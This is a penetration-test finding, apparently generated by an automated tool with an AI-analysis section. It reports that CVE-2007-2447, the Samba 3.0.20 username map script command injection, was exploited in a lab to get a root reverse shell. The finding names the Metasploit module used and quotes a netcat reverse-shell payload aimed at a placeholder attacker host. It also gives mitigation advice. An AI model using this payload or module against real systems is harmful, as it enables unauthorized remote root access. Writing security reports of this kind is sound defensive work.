### [CRITICAL] Samba 3.0.20 Username Map Script — Unauthenticated Root RCE

- **Service:** Port 445/tcp — SMB — Samba 3.0.20-Debian
- **CVE:** CVE-2007-2447 (CVSS **10.0 — Critical**)
- **ExploitDB:** "Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)" — EDB-ID: **16320** ✅ Verified
- **Description:** The MS-RPC functionality in `smbd` in Samba 3.0.0 through 3.0.25rc3 fails to sanitise shell metacharacters in the username field during authentication. When `username map script` is enabled in `smb.conf`, user-supplied input is passed directly to `/bin/sh`, enabling arbitrary command injection prior to any authentication check. This allows a remote, unauthenticated attacker to execute arbitrary OS commands with the privileges of the Samba daemon (`root` in typical configurations).
- **Evidence:** Nmap banner confirmed `Samba smbd 3.0.20-Debian`. Metasploit module `exploit/multi/samba/usermap_script` successfully injected a reverse shell payload via the username field and opened **Shell Session 2** (`192.168.128.1:4444 → 192.168.128.2:58864`). Command `id` returned `uid=0(root) gid=0(root)`.
- **Exploited:** ✅ **YES — Session 2 opened** (cmd/unix shell)
- **AI Analysis (claude-haiku-fallback):** The model confirms this is a pre-authentication command injection with a CVSS of 10.0. The root cause is the absence of input sanitisation for shell metacharacters in the username field before it reaches the `username map script` directive. The attacker injects a payload such as `/bin/sh -c 'nc -e /bin/sh attacker 4444'` directly in the SMB username field. The Samba daemon runs as root by default, making privilege escalation unnecessary. Affects all Samba versions from 3.0.0 to 3.0.25rc3.
- **Recommendation:** **Upgrade Samba immediately to version 3.6.x or later (preferably current stable).** Disable the `username map script` directive in `smb.conf` as an immediate mitigation. Restrict SMB access (ports 139/445) to trusted network segments via firewall ACLs. Enable SMB signing to prevent relay attacks.
- **ATT&CK:** T1190 — Exploit Public-Facing Application; T1021.002 — SMB/Windows Admin Shares (Lateral Movement)
